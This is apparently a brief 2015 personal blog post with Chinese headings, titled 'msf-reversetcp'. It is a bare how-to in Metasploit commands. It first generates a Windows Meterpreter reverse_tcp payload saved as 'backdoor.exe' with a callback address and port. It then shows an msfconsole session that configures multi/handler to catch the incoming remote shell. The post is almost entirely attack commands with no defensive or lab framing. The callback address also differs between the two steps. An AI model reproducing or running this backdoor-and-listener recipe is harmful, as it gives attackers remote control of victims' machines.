---
layout: post
title: "msf-reversetcp"
date: 2015-11-11 23:13:47 +0800
comments: true
categories: 
---
msf revesetcp

###生成backdoor.exe
    msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.130 LPORT=8080 X > ～/Desktop/backdoor.exe

###exploit
    msfconsole
    msf > use exploit/multi/
    Display all 183 possibilities? (y or n)
    msf > use exploit/multi/handler 
    msf exploit(handler) > set payload windows/
    Display all 140 possibilities? (y or n)
    msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
    payload => windows/meterpreter/reverse_tcp
    msf exploit(handler) > set LHOST 192.168.56.1
    LHOST => 192.168.56.1
    msf exploit(handler) > set LPORT 8080
    LPORT => 8080
    msf exploit(handler) > exploit 

